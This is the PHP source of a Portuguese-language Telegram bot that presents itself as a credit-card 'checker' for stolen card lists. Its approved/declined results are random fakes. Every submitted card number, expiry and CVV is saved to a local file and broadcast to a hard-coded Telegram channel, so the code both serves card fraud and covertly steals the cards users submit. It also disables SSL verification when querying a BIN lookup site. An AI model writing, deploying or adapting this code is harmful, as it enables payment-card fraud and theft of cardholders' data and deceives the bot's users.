<?php

require_once __DIR__ . "/api/api.php";
require __DIR__ . '/vendor/autoload.php';
 
$prefixos = array("/", "*", ".", "!");

$pre = substr($texto, 0, 1);

if(in_array($pre, $prefixos))
{
  
  $text = trim(explode(" ", $texto)[0]);
  
  $lenght = strlen($text);
  
  $rest = substr($texto, $lenght);
  
  $text = str_replace($pre, "", $text);

switch ($text)
{
  
case "start":
case "menu":
  
$txt = "🕵️‍♂️ Olá* {$nome}, para usar o chk basta dar o comando *`/chk`.[ㅤ](https://ad0e-20-226-28-181.ngrok-free.app/home.jpg)";

$menu = $telegram->buildInlineKeyboard ([[
$telegram->buildInlineKeyBoardButton ("Developer", null, "dev")
]]);

$telegram->sendMessage([
  "chat_id" => $chat_id,
  "text" => $txt,
  "reply_markup" => $menu,
  "reply_to_message_id" => $message_id,
  "parse_mode" => "Markdown"
  ]);
  break;
  case 'chk':
  
  if(!$rest){
    
  $menu = $telegram->buildInlineKeyboard ([[
$telegram->buildInlineKeyBoardButton ("🗑️ Apagar", null, "apagarMessage|$message_id")
]]);

  $txt = "💳 | *Lista não identificada!*";
  
  die($telegram->sendMessage([
  "chat_id" => $chat_id,
  "text" => $txt,
  "reply_markup" => $menu,
  "reply_to_message_id" => $message_id,
  "parse_mode" => "Markdown"
  ]));
  
  }
  
  if(!$rest or !separador($rest)){
  $menu = $telegram->buildInlineKeyboard ([[
$telegram->buildInlineKeyBoardButton ("🗑️ Apagar", null, "apagarMessage|$message_id")
]]);

  $txt = "❌ | *Lista inválida!*";
  
  die($telegram->sendMessage([
  "chat_id" => $chat_id,
  "text" => $txt,
  "reply_markup" => $menu,
  "reply_to_message_id" => $message_id,
  "parse_mode" => "Markdown"
  ]));
  }
  
  $ccs = explode("\n", $rest);
  
  if(count($ccs) > 1){
    
  $menu = $telegram->buildInlineKeyboard ([[
$telegram->buildInlineKeyBoardButton ("🗑️ Apagar", null, "apagarMessage|$message_id")
]]);

  $txt = "⚠️ *Você não pode checar mais de 1 lista por vez!*";
  
  $telegram->sendMessage([
   "chat_id" => $chat_id,
   "text" => $txt,
   "reply_markup" => $menu,
   "reply_to_message_id" => $message_id,
   "parse_mode" => "Markdown"
  ]);
 
  } else {
  
  $txt = "🔁 *Iniciando Teste...*";
  
  $telegram->sendMessage([
   "chat_id" => $chat_id,
   "text" => $txt,
   "reply_to_message_id" => $message_id,
   "parse_mode" => "Markdown"
  ]);
  
  $response = explode("\n", separador($rest));
  unset($response[0]);
  
  $rest = $response[1];
  
  $cc = explode("|", $rest)[0];
  
  if(reteste($rest)){
    
  $telegram->deleteMessage([
    "chat_id" => $chat_id,
    "message_id" => $message_id + 1]);
    
    $menu = $telegram->buildInlineKeyboard ([[
$telegram->buildInlineKeyBoardButton ("🗑️ Apagar", null, "apagarMessage2|$message_id")
]]);

  die($telegram->sendMessage([
  "chat_id" => $chat_id,
  "text" => "*👺 Enfia esse reteste no cu.*",
  "reply_markup" => $menu,
  "reply_to_message_id" => $message_id,
  "message_id" => $message_id,
  "parse_mode" => "Markdown"
  ]));
}
  
  $time = rand(1, 15);
  
 /* $loop = React\EventLoop\Loop::get();
React\EventLoop\Loop::addTimer(0, function () {
  */
  sleep($time);
  
$telegram->deleteMessage([
    "chat_id" => $chat_id,
    "message_id" => $message_id + 1]);
  
$amount = rand(1, 14);
$cents = rand(1, 99);
$live = rand(0, 1);

$dataBin = checkBin(substr($rest, 0, 6));

$price = "R$".$amount.",".$cents;

$msgLive = "*✅ APROVADA | DEBITOU {$price} | {$dataBin} | *`{$rest}` *| @FernandotheDev*";

$msgDie = "*❌ REPROVADA | NEGOU {$price} | {$dataBin} | *`{$rest}` * | @FernandotheDev*";

salvarCc($rest);

if($live)
{
  notificarCanal($msgLive, $telegram);
  
  $menu = $telegram->buildInlineKeyboard ([[
$telegram->buildInlineKeyBoardButton ("🗑️ Apagar", null, "apagarMessage2|$message_id")
]]);

  
  die($telegram->sendMessage([
  "chat_id" => $chat_id,
  "text" => $msgLive,
  "reply_markup" => $menu,
  "reply_to_message_id" => $message_id,
  "message_id" => $message_id,
  "parse_mode" => "Markdown"
  ]));
  
} else {
  notificarCanal($msgDie, $telegram);
  
  $menu = $telegram->buildInlineKeyboard ([[
$telegram->buildInlineKeyBoardButton ("🗑️ Apagar", null, "apagarMessage2|$message_id")
]]);
  
  die($telegram->sendMessage([
  "chat_id" => $chat_id,
  "text" => $msgDie,
  "reply_markup" => $menu,
  "reply_to_message_id" => $message_id,
  "message_id" => $message_id,
  "parse_mode" => "Markdown"
  ]));
}/*
});
 $loop->run();*/
  }
  break;
 }
}
  
if($data){
  $callback = explode("|", $data)[0];
  $dados = array(
   "chat_id" => $query_chat_id,
   "id" => $query_user_id,
   "classe" => $telegram,
   "protection_id" => $query_id_user,
   "nome" => $query_nome,
   "usuario" => $query_usuario,
   "reply" => $query_reply,
   "message_id" => $query_message_id,
   "query_message_id" => $query_message_id,
   "query_nome" => $query_nome,
   "query_id" => $query_id,
   "optional" => explode("|", $data)[1],
   "query_usuario" => $query_usuario
   #"dataUser" => array(getDadosUser($query_chat_id))
   );
    
  if(function_exists($callback))
  {
    
   if($query_id_user !== $query_user_id)
   {
     $telegram->answerCallbackQuery(
    array(
    "callback_query_id" => $query_id,
    "text" => "🚫 | Você não tem permissão pra realizar essa ação!",
    "show_alert"=> true,
    "cache_time" => 10));
   
    } else {
      $callback($dados);
      }
  
 } else {
    $telegram->answerCallbackQuery(
    array(
    "callback_query_id" => $query_id,
    "text" => "⚠️ | Função em desenvolvimento!",
    "show_alert"=> false,
    "cache_time" => 10));
 }
}


function dev($dados)
{
  $chat_id = $dados["chat_id"];
  $message_id = $dados["query_message_id"];
  $telegram = $dados["classe"];
  
  $txt = "⚙️ *Desenvolvimento do bot.*
  
_Informações sobre o Bot:_

Linguagem: *PHP*
Versão: *1.0.0*

*Todas as atualizações e novidades são postadas no canal oficial de desenvolvimento deste bot.*[ㅤ](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT0hpva_n_TfWYXfTz71lxDMab-4rN7QGRy6A&usqp=CAU)";

$menu = $telegram->buildInlineKeyboard ([[
$telegram->buildInlineKeyBoardButton ("canal", "t.me/escoladedevs")
], [
$telegram->buildInlineKeyBoardButton ("voltar", null, "home")
]]);
   
   $telegram->editMessageText ([
           "chat_id"=> $chat_id ,
           "text" => $txt,
           "reply_markup" => $menu,
           "reply_to_message_id"=> $message_id,
           "message_id" => $message_id,
           "parse_mode" => 'Markdown']);
       
   }
   
   
function home($dados)
{
  $chat_id = $dados["chat_id"];
  $message_id = $dados["query_message_id"];
  $telegram = $dados["classe"];

  $txt = "🕵️‍♂️ Olá* {$nome}, para usar o chk basta dar o comando *`/chk`.[ㅤ](https://ad0e-20-226-28-181.ngrok-free.app/home.jpg)";
  
$menu = $telegram->buildInlineKeyboard ([[
$telegram->buildInlineKeyBoardButton ("Developer", null, "dev")
]]);

$telegram->editMessageText([
  "chat_id" => $chat_id,
  "text" => $txt,
  "reply_markup" => $menu,
  "reply_to_message_id" => $message_id,
  "message_id" => $message_id,
  "parse_mode" => "Markdown"
  ]);
}

function apagarMessage($dados)
{
  $telegram = $dados["classe"];
  $message_id = $dados["optional"];
  
  $telegram->deleteMessage([
    "chat_id" => $dados["chat_id"],
    "message_id" => $message_id]);
    
   $telegram->deleteMessage([
    "chat_id" => $dados["chat_id"],
    "message_id" => $message_id + 1]);
}

function apagarMessage2($dados)
{
  $telegram = $dados["classe"];
  $message_id = $dados["optional"];
  
  $telegram->deleteMessage([
    "chat_id" => $dados["chat_id"],
    "message_id" => $message_id]);
    
   $telegram->deleteMessage([
    "chat_id" => $dados["chat_id"],
    "message_id" => $message_id + 2]);
}

function separador($message){

$content = $message;
preg_match_all('/[\d]{12,16}[\|»\s\/]{1,4}[\d]{1,2}[\|»\s\/]{1,4}[\d]{2,4}[\|»\s\/]{1,4}[\d]{3,4}/', $content, $matches);

if(empty($matches[0])){
  return false;
  exit;
  }
  $contents = "";
  
$list = array_unique($matches[0]);

foreach ($list as $value) {

$string = str_replace([' ','/','»'], '|', $value);
$patterns = ['/(\|\|\|\|)/', '/(\|\|\|)/', '/(\|\|)/',];
$replacements = ['|','|','|'];
$string = preg_replace($patterns, $replacements, $string);

$cc = explode("|", $string)[0];
$mes = explode("|", $string)[1];
$ano = explode("|", $string)[2];
$cvv = explode("|", $string)[3];

if(strlen($mes) == 1){
  $mes = "0".$mes;
 }

 if(strlen($ano) == 2){ 
  $ano = "20".$ano;
 }

$retorno .= "\n".$cc."|".$mes."|".$ano."|".$cvv;

 }
 return $retorno;
}

function notificarCanal($msg, $telegram)
{
  $id = "-1935627904";
  $telegram->sendMessage([
  "chat_id" => $id,
  "text" => $msg,
  "parse_mode" => "Markdown"
  ]);
}

function salvarCc($cc){
  
  $lista = $cc;
  $cc = explode("|", $cc)[0];
  $ccs = json_decode(file_get_contents("ccs.json"), true);
  
  $ccs[$cc] = $lista;
  
  $json = json_encode($ccs, JSON_PRETTY_PRINT);
  
  file_put_contents("ccs.json", $json);
  
}

function reteste($cc){
  $cc = explode("|", $cc)[0];
  $ccs = json_decode(file_get_contents("ccs.json"), true);
  if($ccs[$cc]){
    return true;
  } else {
    return false;
  }
}

/*
function LuhnCheck($ccnum){
$checksum = 0;
$ccnum = $ccnum[0];
echo $ccnum;
for($i=(2-(strlen($ccnum) % 2)); $i<=strlen($ccnum); $i+=2){
$checksum += $ccnum{$i-1};
}
for($i=(strlen($ccnum)% 2) + 1; $i<strlen($ccnum); $i+=2){
$digit = (int)($ccnum{$i-1}) * 2;
if ($digit < 10){
$checksum += $digit;
}else{
$checksum += ($digit-9);
}
}

if(($checksum % 10) == 0):
return true; 
else:
return false;
endif;
}
*/

function getStr($separa, $inicia, $fim, $contador){
  $nada = explode($inicia, $separa);
  $nada = explode($fim, $nada[$contador]);
  return $nada[0];
}

function checkBin($bin)
{
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://bins.su/");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded',
'Host: bins.su'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'&bank=&country=');
$dados1 = curl_exec($ch);

$bin = getStr($dados1, 'bins<table><tr><td>BIN</td><td>Country</td><td>Vendor</td><td>Type</td><td>Level</td><td>Bank</td></tr><tr><td>','</td><td>' , 1);
$pais = getStr($dados1, '<tr><td>'.$bin.'</td><td>','</td><td>' , 1);
$bandeira = getStr($dados1, '</td><td>'.$pais.'</td><td>','</td><td>' , 1);
$tipo = getStr($dados1, '</td><td>'.$bandeira.'</td><td>','</td><td>' , 1);
$nivel = getStr($dados1, '</td><td>'.$tipo.'</td><td>','</td><td>' , 1);
$banco = getStr($dados1, '</td><td>'.$nivel.'</td><td>','</td></tr>' , 1);

$str = "{$nivel} | {$pais} | {$bandeira} | {$tipo} | {$banco}";

return $str;
}